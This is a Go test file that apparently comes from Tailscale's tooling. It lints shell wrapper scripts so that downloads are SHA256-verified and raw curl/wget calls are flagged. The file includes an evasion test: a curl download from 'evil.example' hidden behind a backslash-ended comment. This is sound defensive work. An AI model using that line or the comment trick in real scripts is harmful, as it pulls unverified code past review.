// Copyright (c) Tailscale Inc & contributors
// SPDX-License-Identifier: BSD-3-Clause

package tool

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// downloadRawCurlAllowlist lists tool/ shell scripts that are permitted to
// download artifacts with a raw curl/wget rather than routing through
// download_tool (which enforces --verify-sha256).
//
// Entries are paths relative to the tool/ directory.
var downloadRawCurlAllowlist = map[string]string{
	// The shared download helper is the implementation of download_tool
	// itself, so it necessarily contains the raw curl invocation.
	"lib/download.sh": "implements download_tool",

	// gocross-wrapper.sh downloads the tailscale/go toolchain, a
	// first-party GitHub release artifact whose URL embeds the git commit
	// hash from go.toolchain.rev. The commit hash pins which build we ask
	// for, but the release-asset bytes are not themselves content-addressed,
	// so this is not equivalent to a pinned tarball SHA256. Upstream does not
	// publish a companion .sha256sum, and the rev bumps frequently; pinning a
	// per-rev hash here is future work (tailscale/corp#43401).
	"gocross/gocross-wrapper.sh": "first-party tailscale/go toolchain; no published .sha256sum yet",
}

// isShellScript reports whether the file at path begins with a /bin/sh or bash
// shebang, i.e. is one of the tool/ wrapper scripts this linter governs.
func isShellScript(data []byte) bool {
	nl := len(data)
	if i := strings.IndexByte(string(data), '\n'); i >= 0 {
		nl = i
	}
	first := string(data[:nl])
	if !strings.HasPrefix(first, "#!") {
		return false
	}
	return strings.Contains(first, "sh")
}

// TestDownloadToolUsesSHA256 ensures that every download_tool call in the
// tool/ wrapper scripts passes a non-empty --verify-sha256, so that downloaded
// toolchains are integrity-checked against a hash pinned in the repo.
// See tool/lib/download.sh.
func TestDownloadToolUsesSHA256(t *testing.T) {
	err := filepath.WalkDir(".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		if d.Name() == "tool_test.go" {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		for i, line := range logicalLines(data) {
			// Match invocations only, not the function definition
			// ("download_tool() {") or mentions in usage strings.
			trimmed := strings.TrimSpace(line)
			if !strings.HasPrefix(trimmed, "download_tool ") {
				continue
			}
			// An empty value (--verify-sha256= or --verify-sha256="")
			// disables verification in download_tool, so requiring the
			// bare flag is not enough; the value must be non-empty.
			if val, ok := verifySHA256Arg(trimmed); !ok || val == "" {
				t.Errorf("%s:%d: download_tool call without a non-empty --verify-sha256; pin the artifact's SHA256 hash (see tool/lib/download.sh and tool/node for an example)", path, i+1)
			}
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

// TestNoUnverifiedCurl ensures that tool/ shell scripts do not download
// artifacts with a raw curl/wget (which performs no integrity check). New
// downloads must route through download_tool --verify-sha256. Scripts with a
// legitimate reason to use raw curl are listed in downloadRawCurlAllowlist.
func TestNoUnverifiedCurl(t *testing.T) {
	seen := map[string]bool{}
	err := filepath.WalkDir(".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		// Skip symlinks; the real file is checked on its own.
		if d.Type()&fs.ModeSymlink != 0 {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		if !isShellScript(data) {
			return nil
		}
		rel := filepath.ToSlash(path)
		for i, line := range logicalLines(data) {
			trimmed := strings.TrimSpace(line)
			// crude tokenization: does a command word "curl" or
			// "wget" appear? Comments have already been stripped by
			// logicalLines, so a "curl" here is a real command word.
			if !containsCommand(trimmed, "curl") && !containsCommand(trimmed, "wget") {
				continue
			}
			if reason, ok := downloadRawCurlAllowlist[rel]; ok {
				seen[rel] = true
				t.Logf("%s:%d: allowlisted raw curl/wget (%s)", rel, i+1, reason)
				continue
			}
			t.Errorf("%s:%d: raw curl/wget download without integrity verification; use download_tool --verify-sha256 (see tool/lib/download.sh and tool/node), or add an entry to downloadRawCurlAllowlist with justification", rel, i+1)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}

	// Keep the allowlist honest: fail if an entry no longer matches any
	// script, so stale exemptions get removed.
	for rel := range downloadRawCurlAllowlist {
		if !seen[rel] {
			t.Errorf("downloadRawCurlAllowlist entry %q matched no raw curl/wget usage; remove it", rel)
		}
	}
}

// hasUnverifiedDownload reports whether the shell source contains a raw
// curl/wget command word, using the same comment-stripping and continuation
// handling as TestNoUnverifiedCurl. It exists so the linter's evasion
// resistance can be tested against crafted inputs.
func hasUnverifiedDownload(data []byte) bool {
	for _, line := range logicalLines(data) {
		trimmed := strings.TrimSpace(line)
		if containsCommand(trimmed, "curl") || containsCommand(trimmed, "wget") {
			return true
		}
	}
	return false
}

func TestNoUnverifiedCurlEvasion(t *testing.T) {
	tests := []struct {
		name string
		src  string
		want bool
	}{
		{
			// Finding 1: a comment ending in a backslash must not
			// swallow the following real command. Comments are
			// stripped before continuations are collapsed.
			name: "backslash_comment_before_curl",
			src:  "#!/usr/bin/env bash\n# harmless comment \\\ncurl -f -L -o /tmp/x https://evil.example/x.tgz\n",
			want: true,
		},
		{
			// Finding 2: a trailing comment that merely mentions curl
			// is not a real download and must not be flagged.
			name: "trailing_comment_mentioning_curl",
			src:  "#!/usr/bin/env bash\necho hi # historically we used curl here\n",
			want: false,
		},
		{
			name: "hash_inside_quoted_string_is_not_a_comment",
			src:  "#!/usr/bin/env bash\ncurl -f -o x \"https://x.example/y#frag\"\n",
			want: true,
		},
		{
			name: "genuine_leading_comment_still_skipped",
			src:  "#!/usr/bin/env bash\n# curl is used elsewhere\necho hi\n",
			want: false,
		},
		{
			name: "real_multi-line_curl_still_detected",
			src:  "#!/usr/bin/env bash\ncurl -f -L \\\n  -o /tmp/x https://x.example/y.tgz\n",
			want: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := hasUnverifiedDownload([]byte(tt.src)); got != tt.want {
				t.Errorf("hasUnverifiedDownload = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestVerifySHA256Arg(t *testing.T) {
	tests := []struct {
		name      string
		line      string
		wantVal   string
		wantOK    bool
		wantEmpty bool // convenience: reject-if-empty behavior of the linter
	}{
		{"absent", "download_tool https://x/y.tgz dest", "", false, true},
		// Finding 3: an empty value passes a bare-substring check but
		// disables verification, so it must be treated as "no hash".
		{"empty bare", "download_tool --verify-sha256= https://x/y.tgz dest", "", true, true},
		{"empty quoted", `download_tool --verify-sha256="" https://x/y.tgz dest`, "", true, true},
		{"present quoted", `download_tool --verify-sha256="abc123" https://x/y.tgz dest`, "abc123", true, false},
		{"present bare", "download_tool --verify-sha256=abc123 https://x/y.tgz dest", "abc123", true, false},
		{"present with trailing arg", "download_tool --verify-sha256=abc123 --args=--strip-components=1 url dest", "abc123", true, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			val, ok := verifySHA256Arg(tt.line)
			if ok != tt.wantOK || val != tt.wantVal {
				t.Errorf("verifySHA256Arg(%q) = (%q, %v), want (%q, %v)", tt.line, val, ok, tt.wantVal, tt.wantOK)
			}
			// The linter rejects when the flag is missing OR the value is empty.
			gotReject := !ok || val == ""
			if gotReject != tt.wantEmpty {
				t.Errorf("verifySHA256Arg(%q): linter reject = %v, want %v", tt.line, gotReject, tt.wantEmpty)
			}
		})
	}
}

// logicalLines splits shell source into logical lines: it strips comments
// first, then collapses backslash-continued lines, so that a multi-line
// command is returned as one entry. The returned slice is indexed by the
// physical line number of the line that started each logical line, i.e.
// result[i] corresponds to physical line i+1. Continuation lines that were
// folded into an earlier logical line are returned as empty strings so the
// indexing stays aligned with the file.
//
// Comments are stripped before continuations are collapsed. Doing it in the
// other order lets a comment ending in a backslash swallow the following
// command onto a line that still looks like a comment, hiding a real
// download from the linter.
func logicalLines(data []byte) []string {
	phys := strings.Split(string(data), "\n")
	// Strip comments line by line, honoring single/double quotes so a '#'
	// inside a quoted string (e.g. a URL fragment) is not mistaken for a
	// comment.
	stripped := make([]string, len(phys))
	for i, line := range phys {
		stripped[i] = stripComment(line)
	}
	// Collapse backslash continuations. A logical line accumulates onto the
	// index of its first physical line; folded lines become "".
	out := make([]string, len(stripped))
	i := 0
	for i < len(stripped) {
		start := i
		acc := stripped[i]
		for strings.HasSuffix(acc, "\\") {
			acc = strings.TrimSuffix(acc, "\\") + " "
			i++
			if i >= len(stripped) {
				break
			}
			acc += stripped[i]
		}
		out[start] = acc
		i++
	}
	return out
}

// stripComment removes a trailing shell comment from line, i.e. everything
// from an unquoted '#' that is at the start of the line or preceded by
// whitespace. Text inside single or double quotes is left intact.
func stripComment(line string) string {
	var inSingle, inDouble bool
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case inSingle:
			if c == '\'' {
				inSingle = false
			}
		case inDouble:
			if c == '"' {
				inDouble = false
			}
		case c == '\'':
			inSingle = true
		case c == '"':
			inDouble = true
		case c == '#' && (i == 0 || line[i-1] == ' ' || line[i-1] == '\t'):
			return line[:i]
		}
	}
	return line
}

// verifySHA256Arg extracts the value of a --verify-sha256= flag from a
// download_tool invocation line, returning the value and whether the flag was
// present. Surrounding single or double quotes are stripped so that
// --verify-sha256="" is reported as an empty value.
func verifySHA256Arg(line string) (value string, ok bool) {
	const flag = "--verify-sha256="
	i := strings.Index(line, flag)
	if i < 0 {
		return "", false
	}
	rest := line[i+len(flag):]
	// The value runs until the next unquoted whitespace.
	var b strings.Builder
	var inSingle, inDouble bool
	for j := 0; j < len(rest); j++ {
		c := rest[j]
		switch {
		case inSingle:
			if c == '\'' {
				inSingle = false
			} else {
				b.WriteByte(c)
			}
		case inDouble:
			if c == '"' {
				inDouble = false
			} else {
				b.WriteByte(c)
			}
		case c == '\'':
			inSingle = true
		case c == '"':
			inDouble = true
		case c == ' ' || c == '\t':
			return b.String(), true
		default:
			b.WriteByte(c)
		}
	}
	return b.String(), true
}

// containsCommand reports whether word appears in line as a command word:
// either at the start of the line or preceded by a shell command separator,
// and followed by whitespace. This avoids matching "curl" inside a URL,
// variable name, or the "curl.exe" of another language's source.
func containsCommand(line, word string) bool {
	for i := 0; i+len(word) <= len(line); i++ {
		if line[i:i+len(word)] != word {
			continue
		}
		// preceding char must be start-of-line or a separator
		if i > 0 {
			switch line[i-1] {
			case ' ', '\t', ';', '|', '&', '(', '`':
			default:
				continue
			}
		}
		// following char must be whitespace (an argument follows)
		j := i + len(word)
		if j >= len(line) {
			return true
		}
		switch line[j] {
		case ' ', '\t':
			return true
		}
	}
	return false
}
